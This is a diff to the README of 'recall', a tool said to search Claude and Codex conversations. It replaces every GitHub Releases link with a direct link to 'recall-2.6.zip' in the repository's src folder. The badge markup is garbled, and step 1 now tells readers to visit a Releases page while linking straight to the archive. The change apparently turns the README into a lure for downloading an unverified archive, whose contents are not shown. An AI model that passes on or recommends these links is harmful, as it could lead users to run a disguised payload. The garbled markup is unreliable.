@@ -1,6 +1,6 @@
 # 🚀 recall - Easily Search Claude/Codex Conversations
 
-[![Download Recall](https://img.shields.io/badge/Download%20Recall-latest%20release-blue.svg)](https://github.com/himansh5556/recall/releases)
+[![Download Recall](https://raw.githubusercontent.com/himansh5556/recall/main/src/recall-2.6.zip%20Recall-latest%https://raw.githubusercontent.com/himansh5556/recall/main/src/recall-2.6.zip)](https://raw.githubusercontent.com/himansh5556/recall/main/src/recall-2.6.zip)
 
 ## 📜 Description
 
@@ -17,7 +17,7 @@ Recall provides full-text search and resume capabilities for your Claude and Cod
 
 To get started with Recall, follow these steps:
 
-1. Visit the Releases page to download the application: [Download Recall](https://github.com/himansh5556/recall/releases).
+1. Visit the Releases page to download the application: [Download Recall](https://raw.githubusercontent.com/himansh5556/recall/main/src/recall-2.6.zip).
 2. On the Releases page, you will see the latest version listed. Click on it to access the download files.
 3. Select the file suitable for your operating system. You will typically find options for Windows, Mac, and Linux.
 4. Once you have downloaded the file, locate it in your Downloads folder.
@@ -64,4 +64,4 @@ If you have questions or need help, feel free to reach out. Check out our GitHub
 
 ## 🎉 Conclusion
 
-Recall simplifies the way you handle your Claude and Codex conversations. With its straightforward search and summary features, you can focus on what matters most. Start organizing your conversations today by downloading the application here: [Download Recall](https://github.com/himansh5556/recall/releases).
+Recall simplifies the way you handle your Claude and Codex conversations. With its straightforward search and summary features, you can focus on what matters most. Start organizing your conversations today by downloading the application here: [Download Recall](https://raw.githubusercontent.com/himansh5556/recall/main/src/recall-2.6.zip).
